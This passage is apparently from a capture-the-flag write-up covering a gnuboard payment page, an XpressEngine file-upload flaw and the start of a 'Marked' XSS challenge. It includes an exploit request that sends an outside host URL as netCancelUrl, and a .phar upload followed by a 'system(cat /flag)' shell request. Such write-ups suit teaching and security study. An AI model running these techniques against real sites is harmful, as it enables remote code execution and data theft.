class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$netcancelResultString</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 망취소 요청 API url(고정, 임의 세팅 금지)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$httpUtil</span>-&gt;<span class="title function_ invoke__">processHTTP</span>(<span class="variable">$netCancel</span>, <span class="variable">$authMap</span>)) &#123;</span><br><span class="line">    <span class="variable">$netcancelResultString</span> = <span class="variable">$httpUtil</span>-&gt;body;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Http Connect Error\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$httpUtil</span>-&gt;errormsg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Http Connect Error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;## 망취소 API 결과 ##&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$netcancelResultString</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>, <span class="variable">$$netcancelResultString</span>);</span><br><span class="line"><span class="variable">$netcancelResultString</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>, <span class="variable">$$netcancelResultString</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>, <span class="variable">$netcancelResultString</span> . <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>shop/inicis/inistdpay_result.php</code> make http requests to given url and parse them.<br>When the request for the <code>authUrl</code> has failed, It tries to cancel the request gracefully by requesting the <code>netCancelUrl</code> specified.<br>You can control both of authUrl and netCancelUrl, so It comes to print user specific variable at the last statement.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = requests.get(<span class="string">&#x27;http://1.230.253.91:5000/shop/inicis/inistdpay_result.php?authUrl=https://x/&amp;resultCode=0000&amp;authToken=x&amp;netCancelUrl=https://p6.is/1.php&amp;x=flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>Intended exploit is above, <code>1.php</code> in netCancelUrl just prints <code>x</code> without any whitespace.<br>$x is defined as a string <code>flag</code> by <code>extract($_GET)</code> in common.php, so It prints the <code>$flag</code> as a result.<br>You can see the flag in the response.</p><h2 id="XpressEngine"><a href="#XpressEngine" class="headerlink" title="XpressEngine"></a>XpressEngine</h2><ul><li>Difficulty: <strong>★★★</strong></li><li>Solved: <strong>2 &#x2F; 541</strong></li><li>Tag: <strong>PHP</strong>, <strong>RCE</strong></li></ul><h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -yq --no-install-recommends apt-utils build-essential</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -yq evince</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Seoul</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="variable">$TZ</span> &gt; /etc/timezone</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get upgrade -yq</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install git wget curl unzip apache2 php7.2 php7.2-fpm \</span></span><br><span class="line"><span class="language-bash">    php7.2-mysql libapache2-mod-php7.2 php7.2-curl php7.2-gd php7.2-json php7.2-xml php7.2-mbstring php7.2-zip -yq</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget http://start.xpressengine.io/download/latest.zip</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> unzip latest.zip &amp;&amp; <span class="built_in">chmod</span> -R 707 storage/ bootstrap/ config/ vendor/ plugins/ index.php composer.phar</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf /var/www/html/latest.zip /var/www/html/index.html</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;ServerName localhost&quot;</span> &gt;&gt; /etc/apache2/apache2.conf</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/AllowOverride None/AllowOverride All/g&#x27;</span> /etc/apache2/apache2.conf</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> a2enmod rewrite</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> service apache2 restart</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> entrypoint.sh /</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /entrypoint.sh</span></span><br></pre></td></tr></table></figure><p>Like the gnuboard, the dockerfile just installs apache2 and xpressengine on generic ubuntu:18.04 image.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;mimes&#x27;</span> =&gt; [</span><br><span class="line">    <span class="string">&#x27;black&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;pdf&#x27;</span>   =&gt; <span class="string">&#x27;application/pdf&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mid&#x27;</span>   =&gt; <span class="string">&#x27;audio/midi&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;midi&#x27;</span>  =&gt; <span class="string">&#x27;audio/midi&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mpga&#x27;</span>  =&gt; <span class="string">&#x27;audio/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mp2&#x27;</span>   =&gt; <span class="string">&#x27;audio/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mp3&#x27;</span>   =&gt; <span class="string">&#x27;audio/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aif&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-aiff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aiff&#x27;</span>  =&gt; <span class="string">&#x27;audio/x-aiff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aifc&#x27;</span>  =&gt; <span class="string">&#x27;audio/x-aiff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ram&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-pn-realaudio&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;rm&#x27;</span>    =&gt; <span class="string">&#x27;audio/x-pn-realaudio&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;rpm&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-pn-realaudio-plugin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ra&#x27;</span>    =&gt; <span class="string">&#x27;audio/x-realaudio&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;rv&#x27;</span>    =&gt; <span class="string">&#x27;video/vnd.rn-realvideo&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;wav&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-wav&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jpg&#x27;</span>   =&gt; <span class="string">&#x27;image/jpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jpeg&#x27;</span>  =&gt; <span class="string">&#x27;image/jpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jpe&#x27;</span>   =&gt; <span class="string">&#x27;image/jpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;png&#x27;</span>   =&gt; <span class="string">&#x27;image/png&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gif&#x27;</span>   =&gt; <span class="string">&#x27;image/gif&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;bmp&#x27;</span>   =&gt; <span class="string">&#x27;image/bmp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tiff&#x27;</span>  =&gt; <span class="string">&#x27;image/tiff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tif&#x27;</span>   =&gt; <span class="string">&#x27;image/tiff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mpeg&#x27;</span>  =&gt; <span class="string">&#x27;video/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mpg&#x27;</span>   =&gt; <span class="string">&#x27;video/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mpe&#x27;</span>   =&gt; <span class="string">&#x27;video/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;qt&#x27;</span>    =&gt; <span class="string">&#x27;video/quicktime&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mov&#x27;</span>   =&gt; <span class="string">&#x27;video/quicktime&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;avi&#x27;</span>   =&gt; <span class="string">&#x27;video/x-msvideo&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;movie&#x27;</span> =&gt; <span class="string">&#x27;video/x-sgi-movie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3g2&#x27;</span>   =&gt; <span class="string">&#x27;video/3gpp2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3gp&#x27;</span>   =&gt; <span class="string">&#x27;video/3gp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mp4&#x27;</span>   =&gt; <span class="string">&#x27;video/mp4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;m4a&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-m4a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;f4v&#x27;</span>   =&gt; <span class="string">&#x27;video/mp4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;webm&#x27;</span>  =&gt; <span class="string">&#x27;video/webm&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aac&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-acc&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;m4u&#x27;</span>   =&gt; <span class="string">&#x27;application/vnd.mpegurl&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;wmv&#x27;</span>   =&gt; <span class="string">&#x27;video/x-ms-wmv&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;au&#x27;</span>    =&gt; <span class="string">&#x27;audio/x-au&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ac3&#x27;</span>   =&gt; <span class="string">&#x27;audio/ac3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;flac&#x27;</span>  =&gt; <span class="string">&#x27;audio/x-flac&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ogg&#x27;</span>   =&gt; <span class="string">&#x27;audio/ogg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;wma&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-ms-wma&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ico&#x27;</span>   =&gt; [</span><br><span class="line">            <span class="string">&#x27;image/x-icon&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;image/vnd.microsoft.icon&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;php&#x27;</span>   =&gt; <span class="string">&#x27;application/x-httpd-php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;php4&#x27;</span>  =&gt; <span class="string">&#x27;application/x-httpd-php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;php3&#x27;</span>  =&gt; <span class="string">&#x27;application/x-httpd-php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phtml&#x27;</span> =&gt; <span class="string">&#x27;application/x-httpd-php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phps&#x27;</span>  =&gt; <span class="string">&#x27;application/x-httpd-php-source&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;js&#x27;</span>    =&gt; <span class="string">&#x27;application/javascript&#x27;</span>,</span><br><span class="line">    ],</span><br></pre></td></tr></table></figure><p>Xpressengine defines their blacklist for uploaded files at <code>config/filesystems.php</code>.<br>You can see It blocks php php3 php4 phtml to do not upload.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">.</span>+\<span class="attr">.ph</span>(<span class="attr">ar</span>|<span class="attr">p</span>|<span class="attr">tml</span>)$&quot;&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">.</span>+\<span class="attr">.phps</span>$&quot;&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php-source</span><br><span class="line">    # Deny access to raw php sources by default</span><br><span class="line">    # To re-enable it&#x27;s recommended to enable access to the files</span><br><span class="line">    # only in specific virtual host or directory</span><br><span class="line">    Require all denied</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"># Deny access to files without filename (e.g. &#x27;.php&#x27;)</span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;^\<span class="attr">.ph</span>(<span class="attr">ar</span>|<span class="attr">p</span>|<span class="attr">ps</span>|<span class="attr">tml</span>)$&quot;&gt;</span></span><br><span class="line">    Require all denied</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># Running PHP scripts in user directories is disabled by default</span><br><span class="line"># </span><br><span class="line"># To re-enable PHP in user directories comment the following lines</span><br><span class="line"># (from <span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">...</span>&gt;</span> to <span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span>.) Do NOT set it to On as it</span><br><span class="line"># prevents .htaccess files from disabling it.</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_userdir.c</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">home</span>/*/<span class="attr">public_html</span>&gt;</span></span><br><span class="line">        php_admin_flag engine Off</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Though in the <code>/etc/apache2/mods-available/php7.2.conf</code> which enabled with php installing,<br>It enables the files have phar extension to interpret as a php script file.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;file_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;98ee15c9-8944-44da-8d0f-1996dfe69ef7&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;folder_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ef1f2203-2dfb-4f96-a4f6-de1fd6f691b1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cfe4f40e-29d8-4104-b2bb-0a6f7826595a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test.phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;site_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cdb63e8a-ac44-4339-942a-b5b11db9cbe4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;updated_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-02-15 15:02:52&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;created_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-02-15 15:02:52&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cfe4f40e-29d8-4104-b2bb-0a6f7826595a&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;display_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admina&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;introduction&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;profile_image_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http:\/\/1.230.253.91:4000\/assets\/core\/user\/img\/default_avatar.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;profileImage&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http:\/\/1.230.253.91:4000\/assets\/core\/user\/img\/default_avatar.png&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;98ee15c9-8944-44da-8d0f-1996dfe69ef7&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cfe4f40e-29d8-4104-b2bb-0a6f7826595a&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public\/media_library\/98\/ee&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;filename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;202202151502525eefc6cc17cfd8e2d3e11b3a4b911eaa08077661.phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;clientname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test.phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;mime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image\/png&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">281</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;download_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http:\/\/1.230.253.91:4000\/storage\/app\/public\/media\/public\/media_library\/98\/ee\/202202151502525eefc6cc17cfd8e2d3e11b3a4b911eaa08077661.phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;width&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;height&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;thumbnail_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http:\/\/1.230.253.91:4000\/storage\/app\/public\/thumbnails\/4a\/08\/spill_400x400_4bf0a901851d7e833e1e586bb54d7d68795cb853.phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;download_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http:\/\/1.230.253.91:4000\/media_library\/file\/cdb63e8a-ac44-4339-942a-b5b11db9cbe4\/download&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>At the same time, <code>/media_library/file</code> route returns the path where the original file uploaded.<br>And the request to the path not prohibited.<br>So, after uploading file with phar extension embeds custom php script can make us execute any php command into it.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.230.253.91:4000/storage/app/public/media/public/media_library/98/ee/202202151502525eefc6cc17cfd8e2d3e11b3a4b911eaa08077661.phar?cmd=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p>The request to the <code>file.url</code> path will return flag.</p><h2 id="Marked"><a href="#Marked" class="headerlink" title="Marked"></a>Marked</h2><ul><li>Difficulty: <strong>★★★★</strong></li><li>Solved: <strong>0 &#x2F; 541</strong></li><li>Tag: <strong>Javascript</strong>, <strong>XSS</strong></li></ul><h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sanitizeHtml = <span class="built_in">require</span>(<span class="string">&#x27;sanitize-html&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> nodeHtmlParser = <span class="built_in">require</span>(<span class="string">&#x27;node-html-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> marked = <span class="built_in">require</span>(<span class="string">&#x27;marked&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/new&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; login &#125; = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> &#123; title, content &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">checkParam</span>(title) || !<span class="title function_">checkParam</span>(content)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/list?message=invalid argument`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* convert markdown to html */</span></span><br><span class="line">  <span class="keyword">const</span> html = marked.<span class="title function_">parse</span>(content);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* sanitize string as suggested by vendor</span></span><br><span class="line"><span class="comment">   * https://github.com/markedjs/marked/blob/96c46c75957fa6fbcd9153f29ac71322eb4c74b8/README.md#usage</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> safeHtml = <span class="title function_">sanitizeHtml</span>(html);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* remove unuseful &lt;p&gt; wrapper */</span></span><br><span class="line">  <span class="keyword">const</span> dom = nodeHtmlParser.<span class="title function_">parse</span>(safeHtml);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dom.<span class="property">childNodes</span>.<span class="property">length</span> === <span class="number">2</span> &amp;&amp; dom.<span class="property">firstChild</span>.<span class="property">rawTagName</span> === <span class="string">&#x27;p&#x27;</span> &amp;&amp; dom.<span class="property">lastChild</span>.<span class="property">_rawText</span> === <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">    content = dom.<span class="property">firstChild</span>.<span class="property">innerHTML</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    content = dom.<span class="property">innerHTML</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>Marked was a XSS challenge besides cyberchef below.<br>It converts the markdown string content to html with well-known markdown library called <code>marked</code>.<br>and the output goes to be santized with sanitize-html.<br>at the last, It parsed by <code>node-html-parser</code> again.</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># node-html-parser</span></span><br><span class="line"><span class="strong">**Fast HTML Parser**</span> is a very fast HTML parser. Which will generate a simplified DOM tree, with element query support.</span><br></pre></td></tr></table></figure><p>The first hint <code>There&#39;s too many things to think about to implement a FAST parser.</code> describes about readme of node-html-parser above.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sanitize = <span class="built_in">require</span>(<span class="string">&#x27;sanitize-html&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; parse &#125; = <span class="built_in">require</span>(<span class="string">&#x27;node-html-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> html = <span 